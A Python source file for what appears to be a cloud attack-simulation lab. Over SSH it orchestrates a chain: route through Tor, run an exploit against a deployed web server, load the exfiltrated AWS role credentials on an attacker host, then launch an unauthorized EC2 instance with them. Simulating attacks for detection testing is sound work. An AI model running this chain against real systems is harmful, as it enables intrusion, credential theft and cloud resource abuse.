import os
import subprocess
import json
from tqdm import tqdm
from time import sleep
from termcolor import colored
from core.helpers import generate_ssh_key
from core.helpers import loading_animation, upload_file_to_server
from core.report import gen_report

class ScenarioExecution:
    def __init__(self):
        pass

    def execute(self):
        print("-"*30)
        print(colored("Executing Scenario 1 : Exploit Vulnerable Application, EC2 takeover, Credential Exfiltration & Anomalous Compute Provisioning ", color="red"))
        self.generate_ssh_key()
        self.loading_animation()
        print("-"*30)
        print(colored("Rolling out Infra", color="red"))
        self.loading_animation()
        print("-"*30)
        self.remove_file()
        self.execute_pulumi()

        print("-"*30)
        print(colored("Bringing up the Vulnerable Application", color="red"))
        self.loading_animation()

        sleep_duration = 300
        with tqdm(total=sleep_duration, desc="Loading") as pbar:
            while sleep_duration > 0:
                sleep_interval = min(1, sleep_duration)
                sleep(sleep_interval)

                pbar.update(sleep_interval)
                sleep_duration -= sleep_interval

        print("-"*30)
        print(colored("Export Meta Data of Infra", color="red"))

        print("-"*30)
        print(colored("Get into the attacker machine - Tor Node", color="red"))
        self.loading_animation()

        self.get_data()
        self.execute_exploit()
        self.ec2_takeover()
        self.exfiltrate_credentials()
        self.anomalous_infra_rollout()

        print("-"*30)
        print(colored("Generating Report", color="red"))
        self.loading_animation()
        self.generate_report()

    def generate_ssh_key(self):
        generate_ssh_key()

    def loading_animation(self):
        loading_animation()

    def remove_file(self):
        base_directory = os.path.abspath('.')
        sub_directory = "core"
        file_name = "cobra-scenario-1-output.json"
        file_path = os.path.join(base_directory, sub_directory, file_name)
        if os.path.exists(file_path):
            os.remove(file_path)
            print("File '{}' found and deleted.".format(file_path))
        else:
            print("File '{}' not found.".format(file_path))

    def execute_pulumi(self):
        subprocess.call("pulumi -C scenarios/scenario_1/infra/ up -s cobra-scenario-1 --yes", shell=True)
        subprocess.call("pulumi -C scenarios/scenario_1/infra/ stack -s cobra-scenario-1 output --json >> core/cobra-scenario-1-output.json", shell=True)

    def get_data(self):
        with open("./core/cobra-scenario-1-output.json", "r") as file:
            data = json.load(file)

        self.ATTACKER_SERVER_PUBLIC_IP = data["Attacker Server Public IP"]
        self.WEB_SERVER_PUBLIC_IP = data["Web Server Public IP"]
        self.ATTACKER_SERVER_INSTANCE_ID = data["Attacker Server Instance ID"]
        self.WEB_SERVER_INSTANCE_ID = data["Web Server Instance ID"]
        self.SUBNET_ID = data["Subnet ID"]
        self.AMI_ID = data["AMI ID"]
        self.KEY_PAIR_NAME = data["Key Pair Name"]
        self.REGION = data["Region"]
        self.INSTANCE_NAME = "Cobra-Anomalous"
        

    def execute_exploit(self):
        print("-"*30)
        print(colored("Running exploit on Remote Web Server", color="red"))
        self.loading_animation()
        subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@"+self.ATTACKER_SERVER_PUBLIC_IP+" 'sudo python3 torghost/torghost.py -s && sudo python3 exploit.py "+self.WEB_SERVER_PUBLIC_IP+" > /home/ubuntu/.aws/credentials'", shell=True)

    def ec2_takeover(self):
        print("-"*30)
        print(colored("Initiate EC2 takeover, got Shell Access", color="red"))
        self.loading_animation()

    def exfiltrate_credentials(self):
        print("-"*30)
        print(colored("Exfiltrate Node Role Credentials and loading Creds in Attackers Machine", color="red"))
        self.loading_animation()

        print("-"*30)
        print(colored("Role Details", color="red"))
        self.loading_animation()
        subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@"+self.ATTACKER_SERVER_PUBLIC_IP+" 'aws sts get-caller-identity'", shell=True)

    def anomalous_infra_rollout(self):
        print("-"*30)
        print(colored("Anomalous Infra Rollout", color="red"))
        self.loading_animation()

        aws_command = (
            f"aws ec2 run-instances --image-id {self.AMI_ID} --instance-type t2.micro --key-name {self.KEY_PAIR_NAME} --subnet-id {self.SUBNET_ID} --region {self.REGION} --tag-specifications 'ResourceType=instance,Tags=[{{Key=Name,Value={self.INSTANCE_NAME}}}]' | jq -r '.Instances[].InstanceId'"
        )

        # Construct the full SSH command with jq and xargs
        ssh_command = (f"ssh -o StrictHostKeyChecking=accept-new -i ./id_rsa ubuntu@{self.ATTACKER_SERVER_PUBLIC_IP} \"{aws_command}\" ")

        # Execute the command
        try:
            instance_id = subprocess.check_output(ssh_command, shell=True, text=True)
            print(instance_id)
        except subprocess.CalledProcessError as e:
            print(f"Command failed with error: {e}")

        subprocess.run(f"pulumi -C scenarios/scenario_1/infra/ import aws:ec2/instance:Instance {self.INSTANCE_NAME.strip()} {instance_id.strip()} --protect=false --yes --stack=cobra-scenario-1 --suppress-outputs --suppress-progress > /dev/null 2>&1", shell=True)

    def generate_report(self):
        gen_report(self.ATTACKER_SERVER_INSTANCE_ID, self.ATTACKER_SERVER_PUBLIC_IP, self.WEB_SERVER_PUBLIC_IP, self.WEB_SERVER_INSTANCE_ID)

    def post_execution(self):
        self.get_data()
        print(colored("Select Post Simulation Task:", color="yellow"))
        print(colored("1. Upload file in Victim Webserver", color="green"))
        print(colored("2. Upload file in Attacker Server", color="green"))
        print(colored("3. SSH inside Victim Webserver", color="green"))
        print(colored("4. SSH inside Attacker Server", color="green"))
        print(colored("5. Execute RCE web attack", color="green"))
        print(colored("6. Perform anomalous compute provision", color="green"))
        print(colored("7. Exit", color="green"))
        while True:
            try:
                choice = int(input(colored("Enter your choice: ", color="yellow")))
                if choice not in [1, 2, 3, 4, 5, 6]:
                    raise ValueError(colored("Invalid choice. Please enter 1, 2, 3, 4, 6 or 5.", color="red"))
                if choice == 1:
                    source_file = input(colored("Enter file path: ", color="yellow"))
                    upload_file_to_server(source_file,server_username='ubuntu', server_ip=self.WEB_SERVER_PUBLIC_IP, server_directory='/home/ubuntu/')
                    print("Uploaded Successfully!!")
                    return
                elif choice == 2:
                    source_file = input(colored("Enter file path: ", color="yellow"))
                    upload_file_to_server(source_file,server_username='ubuntu', server_ip=self.ATTACKER_SERVER_PUBLIC_IP, server_directory='/home/ubuntu/')
                    print("Uploaded Successfully!!")
                    return
                elif choice == 3:
                    subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@"+self.WEB_SERVER_PUBLIC_IP+"", shell=True)
                    return
                elif choice == 4:
                    subprocess.call("ssh -o 'StrictHostKeyChecking accept-new' -i ./id_rsa ubuntu@"+self.ATTACKER_SERVER_PUBLIC_IP+"", shell=True)
                    return
                elif choice == 5:
                    self.execute_exploit()
                    self.ec2_takeover()
                    self.exfiltrate_credentials()
                    return
                elif choice == 6:
                    self.execute_exploit()
                    self.ec2_takeover()
                    self.exfiltrate_credentials()
                    self.anomalous_infra_rollout()
                    return
            except ValueError as e:
                print(e)
